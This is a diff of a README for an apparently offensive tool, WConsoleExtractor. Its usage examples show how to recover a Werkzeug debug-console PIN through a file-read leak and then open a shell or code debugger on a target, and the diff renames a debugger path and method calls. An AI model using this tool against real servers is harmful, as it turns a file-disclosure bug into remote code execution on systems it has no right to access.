@@ -122,12 +122,12 @@ def leak_function(filename) -> str:
 extractor = WConsoleExtractor(
     target="http://localhost:5000",
     leak_function=leak_function,
-    debugger_path="/flag", # Custom debugger path (default: /console)
+    debugger_path="/custom_path", # Custom debugger path (default: /console)
 )
 
 
 info(f"PIN CODE: {extractor.pin_code}")
-extractor.runner()
+extractor.shell()
 ```
 #### Spawn a Code Debugger
 ```py
@@ -144,12 +144,11 @@ def leak_function(filename) -> str:
 extractor = WConsoleExtractor(
     target="http://localhost:5000",
     leak_function=leak_function,
-    debugger_path="/flag", # Custom debugger path (default: /console)
-    spawn_shell = False    # Disable shell spawn and spawn a code debugger (default: True)
+    debugger_path="/custom_path", # Custom debugger path (default: /console)
 )
 
 info(f"PIN CODE: {extractor.pin_code}")
-extractor.runner()
+extractor.debugger()
 ```
 
 ## Author
